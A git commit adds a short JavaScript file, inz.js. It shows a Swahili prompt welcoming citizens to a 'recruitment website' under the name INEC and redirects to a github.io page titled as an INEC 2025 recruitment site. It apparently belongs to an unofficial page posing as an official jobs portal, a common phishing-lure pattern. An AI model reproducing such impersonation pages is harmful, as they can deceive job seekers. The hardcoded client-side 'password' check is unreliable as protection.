181e0a64da52c8e84fa6585ff33e0655ad1701f9
allregnws <promisebassey8081@gmail.com>
2025-04-23 12:18:31 +0100

    Create inz.js

---
+++ inz.js
@@ -0,0 +1,5 @@
+var password = 'INEC'
+password=prompt(':Karibu mpendwa mwananchi kwenye tovuti yetu ya kuajiri tafadhali bofya OK ili kuanza kutuma ombi sasa  ','INEC');
+if (password != 'INEC') {
+location.href='https://allregnws.github.io/INEC.Kuajiri.2025.tz';
+}
